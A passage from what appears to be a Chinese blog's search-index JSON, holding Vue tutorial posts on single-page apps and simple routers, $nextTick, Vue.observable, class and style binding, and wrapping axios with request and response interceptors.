节点再分情况操作\n\n\n\n","categories":["框架"],"tags":["vue"]},{"title":"vue-SPA","url":"/2018/07/09/Vue/vue-SPA/","content":"\n一、什么是SPASPA（single-page application），翻译过来就是单页应用SPA是一种网络应用程序或网站的模型，它通过动态重写当前页面来与用户交互，这种方法避免了页面之间切换打断用户体验在单页应用中，所有必要的代码（HTML、JavaScript和CSS）都通过单个页面的加载而检索，或者根据需要（通常是为响应用户操作）动态装载适当的资源并添加到页面页面在任何时间点都不会重新加载，也不会将控制转移到其他页面。如下图\n\n我们熟知的JS框架如react,vue,angular,ember都属于SPA\n二、SPA和MPA的区别上面大家已经对单页面有所了解了，下面来讲讲多页应用MPA（MultiPage-page application），翻译过来就是多页应用在MPA中，每个页面都是一个主页面，都是独立的当我们在访问另一个页面的时候，都需要重新加载html、css、js文件，公共文件则根据需求按需加载如下图\n\n单页应用与多页应用的区别\n\n\n\n单页面应用（SPA）\n多页面应用（MPA）\n\n\n\n组成\n一个主页面和多个页面片段\n多个主页面\n\n\n刷新方式\n局部刷新\n整页刷新\n\n\nurl模式\n哈希模式\n历史模式\n\n\nSEO搜索引擎优化\n难实现，可使用SSR方式改善\n容易实现\n\n\n数据传递\n容易\n通过url、cookie、localStorage等传递\n\n\n页面切换\n速度快，用户体验良好\n切换加载资源，速度慢，用户体验差\n\n\n维护成本\n相对容易\n相对复杂\n\n\n单页应用优缺点优点：\n\n具有桌面应用的即时性、网站的可移植性和可访问性\n用户体验好、快，内容的改变不需要重新加载整个页面\n良好的前后端分离，分工更明确\n\n缺点：\n\n不利于搜索引擎的抓取\n首次渲染速度相对较慢\n\n三、实现一个SPA原理\n监听地址栏中hash变化驱动界面变化\n用pushsate记录浏览器的历史，驱动界面发送变化\n\n\n实现hash 模式核心通过监听url中的hash来进行路由跳转\n// 定义 Router  class Router &#123;      constructor () &#123;          this.routes = &#123;&#125;; // 存放路由path及callback          this.currentUrl = &#x27;&#x27;;                    // 监听路由change调用相对应的路由回调          window.addEventListener(&#x27;load&#x27;, this.refresh, false);          window.addEventListener(&#x27;hashchange&#x27;, this.refresh, false);      &#125;            route(path, callback)&#123;          this.routes[path] = callback;      &#125;            push(path) &#123;          this.routes[path] &amp;&amp; this.routes[path]()      &#125;  &#125;    // 使用 router  window.miniRouter = new Router();  miniRouter.route(&#x27;/&#x27;, () =&gt; console.log(&#x27;page1&#x27;))  miniRouter.route(&#x27;/page2&#x27;, () =&gt; console.log(&#x27;page2&#x27;))    miniRouter.push(&#x27;/&#x27;) // page1  miniRouter.push(&#x27;/page2&#x27;) // page2  \n\nhistory模式history 模式核心借用 HTML5 history api，api 提供了丰富的 router 相关属性先了解一个几个相关的api\n\nhistory.pushState 浏览器历史纪录添加记录\nhistory.replaceState修改浏览器历史纪录中当前纪录\nhistory.popState 当 history 发生变化时触发\n\n// 定义 Router  class Router &#123;      constructor () &#123;          this.routes = &#123;&#125;;          this.listerPopState()      &#125;            init(path) &#123;          history.replaceState(&#123;path: path&#125;, null, path);          this.routes[path] &amp;&amp; this.routes[path]();      &#125;            route(path, callback)&#123;          this.routes[path] = callback;      &#125;            push(path) &#123;          history.pushState(&#123;path: path&#125;, null, path);          this.routes[path] &amp;&amp; this.routes[path]();      &#125;            listerPopState () &#123;          window.addEventListener(&#x27;popstate&#x27; , e =&gt; &#123;              const path = e.state &amp;&amp; e.state.path;              this.routers[path] &amp;&amp; this.routers[path]()          &#125;)      &#125;  &#125;    // 使用 Router    window.miniRouter = new Router();  miniRouter.route(&#x27;/&#x27;, ()=&gt; console.log(&#x27;page1&#x27;))  miniRouter.route(&#x27;/page2&#x27;, ()=&gt; console.log(&#x27;page2&#x27;))    // 跳转  miniRouter.push(&#x27;/page2&#x27;)  // page2  \n\n\n\n四、题外话：如何给SPA做SEO下面给出基于Vue的SPA如何实现SEO的三种方式\n\nSSR服务端渲染\n\n将组件或页面通过服务器生成html，再返回给浏览器，如nuxt.js\n\n静态化\n\n目前主流的静态化主要有两种：（1）一种是通过程序将动态页面抓取并保存为静态页面，这样的页面的实际存在于服务器的硬盘中（2）另外一种是通过WEB服务器的 URL Rewrite的方式，它的原理是通过web服务器内部模块按一定规则将外部的URL请求转化为内部的文件地址，一句话来说就是把外部请求的静态地址转化为实际的动态页面地址，而静态页面实际是不存在的。这两种方法都达到了实现URL静态化的效果\n\n使用Phantomjs针对爬虫处理\n\n原理是通过Nginx配置，判断访问来源是否为爬虫，如果是则搜索引擎的爬虫请求会转发到一个node server，再通过PhantomJS来解析完整的HTML，返回给爬虫。下面是大致流程图\n\n","categories":["框架"],"tags":["vue"]},{"title":"vue-$nextTick","url":"/2018/06/18/Vue/vue-$nextTick/","content":"一、NextTick是什么官方对其的定义\n\n在下次 DOM 更新循环结束之后执行延迟回调。在修改数据之后立即使用这个方法，获取更新后的 DOM\n\n什么意思呢？\n我们可以理解成，Vue 在更新 DOM 时是异步执行的。当数据发生变化，Vue将开启一个异步更新队列，视图需要等队列中所有数据变化完成之后，再统一进行更新\n举例一下\nHtml结构\n&lt;div id=&quot;app&quot;&gt; &#123;&#123; message &#125;&#125; &lt;/div&gt;\n\n构建一个vue实例\nconst vm = new Vue(&#123;  el: &#x27;#app&#x27;,  data: &#123;    message: &#x27;原始值&#x27;  &#125;&#125;)\n\n修改message\nthis.message = &#x27;修改后的值1&#x27;this.message = &#x27;修改后的值2&#x27;this.message = &#x27;修改后的值3&#x27;\n\n这时候想获取页面最新的DOM节点，却发现获取到的是旧值\nconsole.log(vm.$el.textContent) // 原始值\n\n这是因为message数据在发现变化的时候，vue并不会立刻去更新Dom，而是将修改数据的操作放在了一个异步操作队列中\n如果我们一直修改相同数据，异步操作队列还会进行去重\n等待同一事件循环中的所有数据变化完成之后，会将队列中的事件拿来进行处理，进行DOM的更新\n为什么要有nexttick举个例子\n&#123;&#123;num&#125;&#125;for(let i=0; i&lt;100000; i++)&#123;    num = i&#125;\n\n如果没有 nextTick 更新机制，那么 num 每次更新值都会触发视图更新(上面这段代码也就是会更新10万次视图)，有了nextTick机制，只需要更新一次，所以nextTick本质是一种优化策略\n二、使用场景如果想要在修改数据后立刻得到更新后的DOM结构，可以使用Vue.nextTick()\n第一个参数为：回调函数（可以获取最近的DOM结构）\n第二个参数为：执行函数上下文\n// 修改数据vm.message = &#x27;修改后的值&#x27;// DOM 还没有更新console.log(vm.$el.textContent) // 原始的值Vue.nextTick(function () &#123;  // DOM 更新了  console.log(vm.$el.textContent) // 修改后的值&#125;)\n\n组件内使用 vm.$nextTick() 实例方法只需要通过this.$nextTick()，并且回调函数中的 this 将自动绑定到当前的 Vue 实例上\nthis.message = &#x27;修改后的值&#x27;console.log(this.$el.textContent) // =&gt; &#x27;原始的值&#x27;this.$nextTick(function () &#123;    console.log(this.$el.textContent) // =&gt; &#x27;修改后的值&#x27;&#125;)\n\n$nextTick() 会返回一个 Promise 对象，可以是用async/await完成相同作用的事情\nthis.message = &#x27;修改后的值&#x27;console.log(this.$el.textContent) // =&gt; &#x27;原始的值&#x27;await this.$nextTick()console.log(this.$el.textContent) // =&gt; &#x27;修改后的值&#x27;\n\n三、实现原理源码位置：/src/core/util/next-tick.js\ncallbacks也就是异步操作队列\ncallbacks新增回调函数后又执行了timerFunc函数，pending是用来标识同一个时间只能执行一次\nexport function nextTick(cb?: Function, ctx?: Object) &#123;  let _resolve;  // cb 回调函数会经统一处理压入 callbacks 数组  callbacks.push(() =&gt; &#123;    if (cb) &#123;      // 给 cb 回调函数执行加上了 try-catch 错误处理      try &#123;        cb.call(ctx);      &#125; catch (e) &#123;        handleError(e, ctx, &#x27;nextTick&#x27;);      &#125;    &#125; else if (_resolve) &#123;      _resolve(ctx);    &#125;  &#125;);  // 执行异步延迟函数 timerFunc  if (!pending) &#123;    pending = true;    timerFunc();  &#125;  // 当 nextTick 没有传入函数参数的时候，返回一个 Promise 化的调用  if (!cb &amp;&amp; typeof Promise !== &#x27;undefined&#x27;) &#123;    return new Promise(resolve =&gt; &#123;      _resolve = resolve;    &#125;);  &#125;&#125;\n\ntimerFunc函数定义，这里是根据当前环境支持什么方法则确定调用哪个，分别有：\nPromise.then`、`MutationObserver`、`setImmediate`、`setTimeout\n\n通过上面任意一种方法，进行降级操作\nexport let isUsingMicroTask = falseif (typeof Promise !== &#x27;undefined&#x27; &amp;&amp; isNative(Promise)) &#123;  //判断1：是否原生支持Promise  const p = Promise.resolve()  timerFunc = () =&gt; &#123;    p.then(flushCallbacks)    if (isIOS) setTimeout(noop)  &#125;  isUsingMicroTask = true&#125; else if (!isIE &amp;&amp; typeof MutationObserver !== &#x27;undefined&#x27; &amp;&amp; (  isNative(MutationObserver) ||  MutationObserver.toString() === &#x27;[object MutationObserverConstructor]&#x27;)) &#123;  //判断2：是否原生支持MutationObserver  let counter = 1  const observer = new MutationObserver(flushCallbacks)  const textNode = document.createTextNode(String(counter))  observer.observe(textNode, &#123;    characterData: true  &#125;)  timerFunc = () =&gt; &#123;    counter = (counter + 1) % 2    textNode.data = String(counter)  &#125;  isUsingMicroTask = true&#125; else if (typeof setImmediate !== &#x27;undefined&#x27; &amp;&amp; isNative(setImmediate)) &#123;  //判断3：是否原生支持setImmediate  timerFunc = () =&gt; &#123;    setImmediate(flushCallbacks)  &#125;&#125; else &#123;  //判断4：上面都不行，直接用setTimeout  timerFunc = () =&gt; &#123;    setTimeout(flushCallbacks, 0)  &#125;&#125;\n\n无论是微任务还是宏任务，都会放到flushCallbacks使用\n这里将callbacks里面的函数复制一份，同时callbacks置空\n依次执行callbacks里面的函数\nfunction flushCallbacks () &#123;  pending = false  const copies = callbacks.slice(0)  callbacks.length = 0  for (let i = 0; i &lt; copies.length; i++) &#123;    copies[i]()  &#125;&#125;\n\n\n\n小结：\n\n把回调函数放入callbacks等待执行\n将执行函数放到微任务或者宏任务中\n事件循环到了微任务或者宏任务，执行函数依次执行callbacks中的回调\n\n","categories":["框架"],"tags":["vue"]},{"title":"vue-Vue.observable","url":"/2018/07/17/Vue/vue-Vue.observable/","content":"一、Observable 是什么Observable 翻译过来我们可以理解成可观察的\n我们先来看一下其在Vue中的定义\n\nVue.observable，让一个对象变成响应式数据。Vue 内部会用它来处理 data 函数返回的对象\n\n返回的对象可以直接用于渲染函数和计算属性内，并且会在发生变更时触发相应的更新。也可以作为最小化的跨组件状态存储器\nVue.observable(&#123; count : 1&#125;)\n\n其作用等同于\nnew vue(&#123; count : 1&#125;)\n\n在 Vue 2.x 中，被传入的对象会直接被 Vue.observable 变更，它和被返回的对象是同一个对象\n在 Vue 3.x 中，则会返回一个可响应的代理，而对源对象直接进行变更仍然是不可响应的\n二、使用场景在非父子组件通信时，可以使用通常的bus或者使用vuex，但是实现的功能不是太复杂，而使用上面两个又有点繁琐。这时，observable就是一个很好的选择\n创建一个js文件\n// 引入vueimport Vue from &#x27;vue// 创建state对象，使用observable让state对象可响应export let state = Vue.observable(&#123;  name: &#x27;张三&#x27;,  &#x27;age&#x27;: 38&#125;)// 创建对应的方法export let mutations = &#123;  changeName(name) &#123;    state.name = name  &#125;,  setAge(age) &#123;    state.age = age  &#125;&#125;\n\n在.vue文件中直接使用即可\n&lt;template&gt;  &lt;div&gt;    姓名：&#123;&#123; name &#125;&#125;    年龄：&#123;&#123; age &#125;&#125;    &lt;button @click=&quot;changeName(&#x27;李四&#x27;)&quot;&gt;改变姓名&lt;/button&gt;    &lt;button @click=&quot;setAge(18)&quot;&gt;改变年龄&lt;/button&gt;  &lt;/div&gt;&lt;/template&gt;import &#123; state, mutations &#125; from &#x27;@/storeexport default &#123;  // 在计算属性中拿到值  computed: &#123;    name() &#123;      return state.name    &#125;,    age() &#123;      return state.age    &#125;  &#125;,  // 调用mutations里面的方法，更新数据  methods: &#123;    changeName: mutations.changeName,    setAge: mutations.setAge  &#125;&#125;\n\n三、原理分析源码位置：src\\core\\observer\\index.js\nexport function observe (value: any, asRootData: ?boolean): Observer | void &#123;  if (!isObject(value) || value instanceof VNode) &#123;    return  &#125;  let ob: Observer | void  // 判断是否存在__ob__响应式属性  if (hasOwn(value, &#x27;__ob__&#x27;) &amp;&amp; value.__ob__ instanceof Observer) &#123;    ob = value.__ob__  &#125; else if (    shouldObserve &amp;&amp;    !isServerRendering() &amp;&amp;    (Array.isArray(value) || isPlainObject(value)) &amp;&amp;    Object.isExtensible(value) &amp;&amp;    !value._isVue  ) &#123;    // 实例化Observer响应式对象    ob = new Observer(value)  &#125;  if (asRootData &amp;&amp; ob) &#123;    ob.vmCount++  &#125;  return ob&#125;\n\nObserver类\nexport class Observer &#123;    value: any;    dep: Dep;    vmCount: number; // number of vms that have this object as root $data    constructor (value: any) &#123;        this.value = value        this.dep = new Dep()        this.vmCount = 0        def(value, &#x27;__ob__&#x27;, this)        if (Array.isArray(value)) &#123;            if (hasProto) &#123;                protoAugment(value, arrayMethods)            &#125; else &#123;                copyAugment(value, arrayMethods, arrayKeys)            &#125;            this.observeArray(value)        &#125; else &#123;            // 实例化对象是一个对象，进入walk方法            this.walk(value)        &#125;&#125;\n\nwalk函数\nwalk (obj: Object) &#123;    const keys = Object.keys(obj)    // 遍历key，通过defineReactive创建响应式对象    for (let i = 0; i &lt; keys.length; i++) &#123;        defineReactive(obj, keys[i])    &#125;&#125;\n\ndefineReactive方法\nexport function defineReactive (  obj: Object,  key: string,  val: any,  customSetter?: ?Function,  shallow?: boolean) &#123;  const dep = new Dep()  const property = Object.getOwnPropertyDescriptor(obj, key)  if (property &amp;&amp; property.configurable === false) &#123;    return  &#125;  // cater for pre-defined getter/setters  const getter = property &amp;&amp; property.get  const setter = property &amp;&amp; property.set  if ((!getter || setter) &amp;&amp; arguments.length === 2) &#123;    val = obj[key]  &#125;  let childOb = !shallow &amp;&amp; observe(val)  // 接下来调用Object.defineProperty()给对象定义响应式属性  Object.defineProperty(obj, key, &#123;    enumerable: true,    configurable: true,    get: function reactiveGetter () &#123;      const value = getter ? getter.call(obj) : val      if (Dep.target) &#123;        dep.depend()        if (childOb) &#123;          childOb.dep.depend()          if (Array.isArray(value)) &#123;            dependArray(value)          &#125;        &#125;      &#125;      return value    &#125;,    set: function reactiveSetter (newVal) &#123;      const value = getter ? getter.call(obj) : val      /* eslint-disable no-self-compare */      if (newVal === value || (newVal !== newVal &amp;&amp; value !== value)) &#123;        return      &#125;      /* eslint-enable no-self-compare */      if (process.env.NODE_ENV !== &#x27;production&#x27; &amp;&amp; customSetter) &#123;        customSetter()      &#125;      // #7981: for accessor properties without setter      if (getter &amp;&amp; !setter) return      if (setter) &#123;        setter.call(obj, newVal)      &#125; else &#123;        val = newVal      &#125;      childOb = !shallow &amp;&amp; observe(newVal)      // 对观察者watchers进行通知,state就成了全局响应式对象      dep.notify()    &#125;  &#125;)&#125;","categories":["框架"],"tags":["vue"]},{"title":"vue-class与style绑定","url":"/2018/06/20/Vue/vue-class%E4%B8%8Estyle%E7%BB%91%E5%AE%9A/","content":"一、绑定HTML class\n有三种方法 1、直接绑定 2、数据属性绑定 3、计算属性绑定\n\n1.1 对象语法\n如果数据属性 发生改变，class 列表将相应地更新\n\n&lt;div id=&quot;app&quot;&gt;    &lt;div v-bind:class=&quot;&#123;active:isActive&#125;&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt;var app = new Vue(&#123;    el:&quot;#app&quot;,    data:&#123;        msg:&quot;对象语法&quot;,        isActive:true    &#125;&#125;);&lt;/script&gt;\n\n\nv-bind:class 指令也可以与普通的 class 属性共存\n\n.active&#123;    width: 100px;    height: 100px;    background: red;&#125;        &lt;div id=&quot;app&quot;&gt;    &lt;div class = &quot;box&quot; v-bind:class=&quot;&#123;active:isActive&#125;&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt;    var app = new Vue(&#123;        el:&quot;#app&quot;,        data:&#123;            msg:&quot;对象语法&quot;,            isActive:true        &#125;    &#125;);&lt;/script&gt;\n\n可以直接绑定数据里的一个对象\n.active1&#123;    width: 100px;    height: 100px;    margin-top: 10px;    border: 1px solid #ccc ;&#125;&lt;div id=&quot;app&quot;&gt;    &lt;div v-bind:class=&quot;classObj&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt;var app = new Vue(&#123;    el:&quot;#app&quot;,    data:&#123;        classObj:&#123;            active:true,            aaa:false        &#125;    &#125;&#125;);&lt;/script&gt;\n\n可以在这里绑定返回对象的计算属性。这是一个常用且强大的模式\n&lt;style&gt;.aaa&#123;    background: green;    width: 100px;    height: 100px;    margin-top: 10px;&#125;&lt;/style&gt;&lt;div id=&quot;app&quot;&gt;    &lt;div v-bind:class=&quot;Obj&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt;    var app = new Vue(&#123;        el:&quot;#app&quot;,        data:&#123;            msg:&quot;对象语法&quot;,            isActive:true        &#125;,        computed:&#123;            Obj:function()&#123;                return&#123;                    aaa:this.isActive                &#125;             &#125;        &#125;    &#125;);&lt;/script&gt;\n\n1.2 数组语法\n我们可以把一个数组传给 v-bind:class，以应用一个 class 列表\n\n&lt;style&gt;    .active&#123;        width: 100px;        height: 100px;        background: red;    &#125;    .active1&#123;        color: yellow;    &#125;    .aaa&#123;       border: 5px solid #ccc;    &#125;&lt;/style&gt;&lt;div id=&quot;app&quot;&gt;    &lt;div class = &quot;box&quot; v-bind:class=&quot;[isActive,isActive1,isActive2]&quot;&gt;&#123;&#123;msg&#125;&#125;&lt;/div&gt;&lt;/div&gt;&lt;script&gt;    var app = new Vue(&#123;        el:&quot;#app&quot;,        data:&#123;            msg:&quot;对象语法&quot;,            isActive:&quot;active&quot;,            isActive1:&quot;active1&quot;,            isActive2:&quot;aaa&quot;        &#125;    &#125;);&lt;/script&gt;\n\n可以用三元表达式\n&lt;style&gt;    .active&#123;        width: 100px;        height: 100px;        background: red;    &#125;    .active1&#123;        color: yellow;    &#125;    .aaa&#123;       border: 5px solid #ccc;    &#125;&lt;/style&gt;&lt;div id=&quot;app&quot;&gt;    &lt;div class = &quot;box&quot; v-bind:class=&quot;[isActive,isActive1,isActive5 ? isActive2 : &#x27;&#x27;]&quot;&gt;&#123;&#123;msg&#125;&#125;&lt;/div&gt;&lt;/div&gt;&lt;script&gt;    var app = new Vue(&#123;        el:&quot;#app&quot;,        data:&#123;            msg:&quot;对象语法&quot;,            isActive5:false,            isActive:&quot;active&quot;,            isActive1:&quot;active1&quot;,            isActive2:&quot;aaa&quot;        &#125;    &#125;);&lt;/script&gt;\n\n当有多个条件 class 时这样写有些繁琐。可以在数组语法中使用对象语法\n&lt;style&gt;    .active&#123;        width: 100px;        height: 100px;        background: red;    &#125;    .active1&#123;        color: yellow;    &#125;    .aaa&#123;       border: 5px solid #ccc;    &#125;&lt;/style&gt;&lt;div id=&quot;app&quot;&gt;    &lt;div class = &quot;box&quot; v-bind:class=&quot;[isActive,&#123;active1:isActive5&#125;,isActive5 ? isActive2 : &#x27;&#x27;]&quot;&gt;&#123;&#123;msg&#125;&#125;&lt;/div&gt;&lt;/div&gt;&lt;script&gt;    var app = new Vue(&#123;        el:&quot;#app&quot;,        data:&#123;            msg:&quot;对象语法&quot;,            isActive5:true,            isActive:&quot;active&quot;,            isActive1:&quot;active1&quot;,            isActive2:&quot;aaa&quot;        &#125;    &#125;);&lt;/script&gt;\n\n1.3 在组件上\n在一个自定义组件上用到 class 属性的时候，这些类将被添加到根元素上面，这个元素上已经存在的类不会被覆盖\n\n&lt;style&gt;    .active1&#123;        width: 100px;        background: red;    &#125;    .aaa&#123;        border: 5px solid #ccc;    &#125;    .bbb&#123;        height: 100px;    &#125;&lt;/style&gt;&lt;div id=&quot;app&quot;&gt;    &lt;tanchu v-bind:class=&quot;classObj&quot;&gt;&lt;/tanchu&gt;&lt;/div&gt;&lt;script&gt;    Vue.component(&#x27;tanchu&#x27;, &#123;        template: `&lt;div class=&quot;bbb&quot;&gt;                &lt;input type=&quot;button&quot; value=&quot;弹出&quot;/&gt;            &lt;/div&gt;`    &#125;)        var app = new Vue(&#123;        el:&quot;#app&quot;,        data:&#123;            classObj:&#123;                active1:true,                aaa:true            &#125;        &#125;    &#125;)&lt;/script&gt;\n\n二、绑定内联样式2.1 对象语法&lt;div id=&quot;app&quot;&gt;    &lt;div v-bind:style=&quot;&#123;background:a,border:b,width:c&#125;&quot;&gt;内联样式&lt;/div&gt;    &lt;div v-bind:style=&quot;classObj&quot;&gt;内联样式&lt;/div&gt;&lt;/div&gt;&lt;script&gt;    var app = new Vue(&#123;        el:&quot;#app&quot;,        data:&#123;            a:&quot;red&quot;,            b:&quot;5px solid #ccc&quot;,            c:&quot;100px&quot;            classObj:&#123;                background:&quot;red&quot;,                border:&quot;5px solid #ccc&quot;,                width:&quot;100px&quot;,                marginTop:&quot;10px&quot;            &#125;        &#125;    &#125;)&lt;/script&gt;\n\n2.2 数组语法&lt;div id=&quot;app&quot;&gt;    &lt;!-- 数组语法 --&gt;    &lt;div v-bind:style=&quot;[classObj,classObj1]&quot;&gt;内联样式&lt;/div&gt;&lt;/div&gt;&lt;script&gt;    var app = new Vue(&#123;        el:&quot;#app&quot;,        data:&#123;            classObj:&#123;                background:&quot;red&quot;,                border:&quot;5px solid #ccc&quot;,                width:&quot;100px&quot;            &#125;,            classObj1:&#123;                height:&quot;100px&quot;            &#125;        &#125;    &#125;)&lt;/script&gt;\n\n2.3 自动添加前缀\n当 v-bind:style 使用需要特定前缀的 CSS 属性时，如 transform，Vue.js 会自动侦测并添加相应的前缀\n\n","categories":["框架"],"tags":["vue"]},{"title":"axios封装","url":"/2018/05/27/Vue/vue-axios%E5%B0%81%E8%A3%85/","content":"一、axios 简介\naxios 是一个基于Promise用于浏览器和 nodejs 的 HTTP 客户端，它本身具有以下特征：\n\n\n从浏览器中创建 XMLHttpRequest\n从 node.js 发出 http 请求\n支持Promise API\n拦截请求和响应\n转换请求和响应数据\n取消请求\n自动转换JSON数据\n客户端支持防止CSRF/XSRF\n\n二、axios基础\naxios.request（config）\naxios.get（url [，config]）\naxios.delete（url [，config]）\naxios.head（url [，config]）\naxios.options（url [，config]）\naxios.post（url [，data [，config]]）\naxios.put（url [，data [，config]]）\naxios.patch（url [，data [，config]]）\n\n三、执行 GET 请求// 向具有指定ID的用户发出请求axios.get(&#x27;/user?ID=12345&#x27;).then(function (res) &#123;    console.log(res);&#125;).catch(function (error) &#123;    console.log(error);&#125;); // 也可以通过 params 对象传递参数axios.get(&#x27;/user&#x27;, &#123;    params: &#123;        ID: 12345    &#125;&#125;).then(function (response) &#123;    console.log(response);&#125;).catch(function (error) &#123;    console.log(error);&#125;);\n\n四、执行 POST 请求axios.post(&#x27;/user&#x27;, &#123;    userId:&quot;123&quot;&#125;,&#123;    headers:&#123;        token:&quot;abc&quot;    &#125;&#125;).then(function (res) &#123;    console.log(res);&#125;).catch(function (error) &#123;    console.log(error);&#125;);\n\n五、通过配置方式发送请求\nget请求是发送参数，在params中定义。而POST请求是发送request body,需要在data中定义\n\n// get 在params中定义axios(&#123;    url:&quot;pakage.json&quot;,    method:&quot;get&quot;,    params:&#123;        userId:&quot;123&quot;    &#125;,    headers:&#123;        token:&quot;http-test&quot;    &#125;&#125;).then(res=&gt;&#123;    console.log(res.data);&#125;)// post 在data中定义axios(&#123;    url:&quot;pakage.json&quot;,    method:&quot;post&quot;,    data:&#123;        userId:&quot;123&quot;    &#125;,    headers:&#123;        token:&quot;http-test&quot;    &#125;&#125;).then(res=&gt;&#123;    console.log(res.data);&#125;)\n\n六、执行多个并发请求function getUserAcount()&#123;    // 返回一个promise对象    return axios.get(&quot;/user/1234&quot;);&#125;function getUserPermissions()&#123;    // 返回一个promise对象    return axios.get(&quot;/user/1234/getUserPermissions&quot;);&#125;//一次性返回两个接口axios.all([getUserAccount(),getUserPerssions()]).then(axios.spread((acct, perms) =&gt; &#123;    // spread展开两个返回的结果    //两个请求现已完成&#125;))\n\n七、全局拦截new Vue(&#123;    el:&quot;app&quot;,    data:&#123;        msg:&quot;&quot;    &#125;,    // 初始化生命周期的一个函数    mounted:function()&#123;     //拦截请求之前       axios.interceptors.request.use(config=&gt;&#123;           //这里做一些拦截操作,拦截用户的请求 请求之前做一些loading处理           return config;       &#125;)       //拦截响应之后处理       axios.interceptors.response.use(response=&gt;&#123;           //这里做一些拦截操作,响应以后做什么，在返回数据           return response;       &#125;)    &#125;,    methods: &#123;        get: function() &#123;                &#125;,        post:function() &#123;                   &#125;    &#125;&#125;)\n\n八、请求封装、异常统一处理\nvue中采用axios处理网络请求，避免请求接口重复代码，以及各种网络情况造成的异常情况的判断，采用axios请求封装和异常拦截操作\n\n8.1 axios 请求封装//  引入axios文件包import axios from &#x27;axios&#x27;// POST 方法封装  (参数处理)export const postRequest = (url, params) =&gt; &#123;  return axios(&#123;    method: &#x27;post&#x27;,    url: url,    data: params,    transformRequest: [function (data) &#123;      let ret = &#x27;&#x27;      for (let it in data) &#123;        ret += encodeURIComponent(it) + &#x27;=&#x27; + encodeURIComponent(data[it]) + &#x27;&amp;&#x27;      &#125;      return ret    &#125;],    headers: &#123;      &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;    &#125;  &#125;);&#125;// POST 方法封装  (文件上传)export const uploadFileRequest = (url, params) =&gt; &#123;  return axios(&#123;    method: &#x27;post&#x27;,    url: url,    data: params,    headers: &#123;      &#x27;Content-Type&#x27;: &#x27;multipart/form-data&#x27;    &#125;  &#125;);&#125;//  GET 方法封装export const getRequest = (url) =&gt; &#123;  return axios(&#123;    method: &#x27;get&#x27;,    url: url  &#125;);&#125;//  PUT 方法封装export const putRequest = (url, params) =&gt; &#123;  return axios(&#123;    method: &#x27;put&#x27;,    url: url,    data: params,    transformRequest: [function (data) &#123;      let ret = &#x27;&#x27;      for (let it in data) &#123;        ret += encodeURIComponent(it) + &#x27;=&#x27; + encodeURIComponent(data[it]) + &#x27;&amp;&#x27;      &#125;      return ret    &#125;],    headers: &#123;      &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;    &#125;  &#125;);&#125;//  DELETE 方法封装export const deleteRequest = (url) =&gt; &#123;  return axios(&#123;    method: &#x27;delete&#x27;,    url: url  &#125;);&#125;\n\n8.2 axios请求异常统一处理// 引入依赖包import axios from &#x27;axios&#x27;import &#123;Message&#125; from &#x27;element-ui&#x27;//  REQUEST 请求异常拦截axios.interceptors.request.use(config=&gt; &#123; //==========  所有请求之前都要执行的操作  ==============  return config;&#125;, err=&gt; &#123; //==================  错误处理  ====================  Message.error(&#123;message: &#x27;请求超时!&#x27;&#125;);  return Promise.resolve(err);&#125;)//  RESPONSE 响应异常拦截axios.interceptors.response.use(data=&gt; &#123;//==============  所有请求完成后都要执行的操作  ==================// 第一种方式    // 根据返回的code值来做不同的处理（和后端约定）    switch (data.code) &#123;        case &#x27;0&#x27;:            // exp: 修复iPhone 6+ 微信点击返回出现页面空白的问题            if (isIOS()) &#123;                // 异步以保证数据已渲染到页面上                setTimeout(() =&gt; &#123;                    // 通过滚动强制浏览器进行页面重绘                    document.body.scrollTop += 1                &#125;, 0)            &#125;            // 这一步保证数据返回，如果没有return则会走接下来的代码，不是未登录就是报错            return data        // 需要重新登录        case &#x27;SHIRO_E5001&#x27;:            // 微信生产环境下授权登录            if (isWeChat() &amp;&amp; IS_PRODUCTION) &#123;                axios.get(apis.common.wechat.authorizeUrl).then((&#123; result &#125;) =&gt; &#123;                    location.replace(global.decodeURIComponent(result))                &#125;)            &#125; else &#123;                // 否则跳转到h5登录并带上跳转路由                const search = encodeSearchParams(&#123;                    next: location.href,                &#125;)                location.replace(`/user/login`)            &#125;            // 不显示提示消息            data.description = &#x27;&#x27;            break        default:    &#125;    // 若不是正确的返回code，且已经登录，就抛出错误    const err = new Error(data.description)    err.data = data    err.response = response  // 第二种方式，仅对200和error状态处理  if (data.status &amp;&amp; data.status == 200 &amp;&amp; data.data.status == &#x27;error&#x27;) &#123;    Message.error(&#123;message: data.data.msg&#125;);    return;  &#125;  return data;&#125;, err=&gt; &#123;//==============  错误处理  ====================   if (err &amp;&amp; err.response) &#123;        switch (err.response.status) &#123;            case 400: err.message = &#x27;请求错误(400)&#x27;; break;            case 401: err.message = &#x27;未授权，请重新登录(401)&#x27;; break;            case 403: err.message = &#x27;拒绝访问(403)&#x27;; break;            case 404: err.message = &#x27;请求出错(404)&#x27;; break;            case 408: err.message = &#x27;请求超时(408)&#x27;; break;            case 500: err.message = &#x27;服务器错误(500)&#x27;; break;            case 501: err.message = &#x27;服务未实现(501)&#x27;; break;            case 502: err.message = &#x27;网络错误(502)&#x27;; break;            case 503: err.message = &#x27;服务不可用(503)&#x27;; break;            case 504: err.message = &#x27;网络超时(504)&#x27;; break;            case 505: err.message = &#x27;HTTP版本不受支持(505)&#x27;; break;            default: err.message = `连接出错($&#123;err.response.status&#125;)!`;        &#125;    &#125; else &#123;        err.message = &#x27;连接服务器失败!&#x27;    &#125;  Message.err( &#123;message: err.message &#125; )  return Promise.resolve(err);&#125;)\n\n\n请求出错的时候执行的是：Promise.resolve(err);，而不是Promise.reject(err);，这样无论请求成功还是失败，在成功的回调中都能收到通知\n\n8.3 vue 项目中使用该方法\n在main.js中导入所有请求方法\n\n//  导入所有请求方法import &#123;getRequest,postRequest,deleteRequest,putRequest&#125; from &#x27;./utils/api&#x27;\n\n\n将请求方法添加至 Vue.prototype 上\n\n//  向VUE的原型上添加请求方法Vue.prototype.getRequest = getRequest;Vue.prototype.postRequest = postRequest;Vue.prototype.deleteRequest = deleteRequest;Vue.prototype.putRequest = putRequest;\n\n\n发送请求（请求方法的调用）\n\n//  发送网络请求this.postRequest(&#x27;/login&#x27;, &#123;userName，password&#125;).then(resp=&gt; &#123;        ...    